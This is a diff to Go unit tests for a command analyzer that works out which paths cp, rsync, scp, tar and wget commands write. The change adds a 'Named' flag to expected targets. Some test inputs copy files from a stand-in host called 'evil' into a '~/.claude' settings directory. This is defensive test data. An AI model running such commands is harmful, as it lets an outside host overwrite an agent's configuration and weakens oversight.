@@ -170,7 +170,7 @@ func TestAnalyze_RemoteCopyIntoLocalDirectory(t *testing.T) {
 		{`scp evil:/tmp/settings.json ~/.claude/`, []Target{{Path: "/home/u/.claude", Access: AccessWrite}, {Path: "/home/u/.claude/settings.json", Access: AccessWrite}}},
 		{`rsync evil:settings.json ~/.claude`, []Target{{Path: "/home/u/.claude", Access: AccessWrite}, {Path: "/home/u/.claude/settings.json", Access: AccessWrite}}},
 		{`rsync -a evil:settings.json ~/.claude`, []Target{{Path: "/home/u/.claude", Access: AccessWrite}, {Path: "/home/u/.claude/settings.json", Access: AccessWrite}}},
-		{`rsync -a evil:stage ~/.claude`, []Target{{Path: "/home/u/.claude", Access: AccessWriteTree}, {Path: "/home/u/.claude/stage", Access: AccessWrite}}},
+		{`rsync -a evil:stage ~/.claude`, []Target{{Path: "/home/u/.claude", Access: AccessWriteTree}, {Path: "/home/u/.claude/stage", Access: AccessWrite, Named: true}}},
 	}
 	for _, tc := range cases {
 		t.Run(tc.command, func(t *testing.T) {
@@ -247,10 +247,10 @@ func TestAnalyze_NewWrites(t *testing.T) {
 		{`tar --delete -f /cfg/a.tar member`, []Target{{Path: "/cfg/a.tar", Access: AccessWrite}}},
 		{`tar --cr -f /cfg/a.tar src`, []Target{{Path: "/cfg/a.tar", Access: AccessWrite}}},
 		{`tar --remove-files -cf out.tar /cfg`, []Target{{Path: "/work/out.tar", Access: AccessWrite}, {Path: "/cfg", Access: AccessRemove}}},
-		{`cp -r /tmp/stage /cfg`, []Target{{Path: "/cfg", Access: AccessWriteTree}, {Path: "/cfg/stage", Access: AccessWrite}}},
-		{`cp -rT /tmp/stage /cfg`, []Target{{Path: "/cfg", Access: AccessWriteTree}, {Path: "/cfg/stage", Access: AccessWrite}}},
-		{`cp --recursive /tmp/stage /cfg`, []Target{{Path: "/cfg", Access: AccessWriteTree}, {Path: "/cfg/stage", Access: AccessWrite}}},
-		{`cp --recu /tmp/stage /cfg`, []Target{{Path: "/cfg", Access: AccessWriteTree}, {Path: "/cfg/stage", Access: AccessWrite}}},
+		{`cp -r /tmp/stage /cfg`, []Target{{Path: "/cfg", Access: AccessWriteTree}, {Path: "/cfg/stage", Access: AccessWrite, Named: true}}},
+		{`cp -rT /tmp/stage /cfg`, []Target{{Path: "/cfg", Access: AccessWriteTree}, {Path: "/cfg/stage", Access: AccessWrite, Named: true}}},
+		{`cp --recursive /tmp/stage /cfg`, []Target{{Path: "/cfg", Access: AccessWriteTree}, {Path: "/cfg/stage", Access: AccessWrite, Named: true}}},
+		{`cp --recu /tmp/stage /cfg`, []Target{{Path: "/cfg", Access: AccessWriteTree}, {Path: "/cfg/stage", Access: AccessWrite, Named: true}}},
 		{`cp /tmp/stage/. /cfg`, []Target{{Path: "/cfg", Access: AccessWriteTree}, {Path: "/cfg", Access: AccessWrite}}},
 		{`cp -S .bak a /cfg/b`, []Target{{Path: "/cfg/b", Access: AccessWrite}, {Path: "/cfg/b/a", Access: AccessWrite}}},
 		{`install -m 600 a /cfg/b`, []Target{{Path: "/cfg/b", Access: AccessWrite}, {Path: "/cfg/b/a", Access: AccessWrite}}},
@@ -295,7 +295,7 @@ func TestAnalyze_NewWrites(t *testing.T) {
 		{`rsync --relative ~/a.json /cfg`, []Target{{Path: "/cfg", Access: AccessWrite}, {Path: "/cfg/home/u/a.json", Access: AccessWrite}}},
 		{`cp -a notes.txt ~/`, []Target{{Path: "/home/u", Access: AccessWrite}, {Path: "/home/u/notes.txt", Access: AccessWrite}}},
 		{`rsync -av notes.txt ~/`, []Target{{Path: "/home/u", Access: AccessWrite}, {Path: "/home/u/notes.txt", Access: AccessWrite}}},
-		{`cp -r dotfiles/nvim ~/.config/`, []Target{{Path: "/home/u/.config", Access: AccessWriteTree}, {Path: "/home/u/.config/nvim", Access: AccessWrite}}},
+		{`cp -r dotfiles/nvim ~/.config/`, []Target{{Path: "/home/u/.config", Access: AccessWriteTree}, {Path: "/home/u/.config/nvim", Access: AccessWrite, Named: true}}},
 		{`wget -P ~ https://x.example/file.tgz`, []Target{{Path: "/home/u/file.tgz", Access: AccessWrite}}},
 		{`wget -P ~ --content-disposition https://x.example/get`, []Target{{Path: "/home/u", Access: AccessWriteTree}}},
 		{`wget -O /cfg/a -P ~ https://x.example/file.tgz`, []Target{{Path: "/cfg/a", Access: AccessWrite}}},
